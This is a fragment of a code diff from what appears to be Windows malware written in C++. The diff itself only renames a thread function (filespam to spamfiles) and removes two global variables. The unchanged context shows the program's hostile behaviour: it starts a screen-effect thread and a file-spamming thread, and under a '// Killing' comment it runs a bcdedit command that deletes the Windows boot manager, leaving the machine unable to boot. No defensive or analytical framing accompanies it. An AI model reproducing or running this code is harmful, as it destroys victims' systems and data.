@@ -7,8 +7,6 @@ using namespace std;
 
 static ULONGLONG n, r;
 int randy() { return n = r, n ^= 0x8ebf635bee3c6d25, n ^= n << 5 | n >> 26, n *= 0xf3e05ca5c43e376b, r = n, n & 0x7fffffff; }
-auto path = get_desktop_path();
-int counter = 0;
 
 DWORD WINAPI shader1(LPVOID lpParam) {
     int time = GetTickCount();
@@ -74,7 +72,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         SetCursorPos(0, 0);
 
         CreateThread(0, 0, shader1, 0, 0, 0);
-		CreateThread(0, 0, filespam, 0, 0, 0);
+		CreateThread(0, 0, spamfiles, 0, 0, 0);
 
         // Killing
         system("bcdedit /store c:\\boot\\bcd /delete {bootmgr} /f");
@@ -117,6 +115,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
 	return 0;
 }
+
 
 
 
